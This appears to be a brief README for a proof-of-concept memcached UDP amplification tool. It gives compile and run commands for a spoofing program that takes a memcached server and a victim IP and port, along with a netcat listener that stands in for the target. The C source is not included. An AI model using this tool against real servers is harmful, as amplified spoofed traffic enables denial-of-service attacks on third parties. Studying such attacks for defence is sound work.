# memcached_amplification
Proof of concept for memcached amplification attack over UDP

# Compile
gcc spoof_memcached_udp_request.c spoof_memcached_udp_request

# Run
./spoof_memcached_udp_request <memcached_server_ip> <memcached_server_port> <target_ip> <target_port>

`./spoof_memcached_udp_request 127.0.0.1 11211 127.0.0.1 8888`

# Faking a target server
`sudo nc -ul -p 8888`
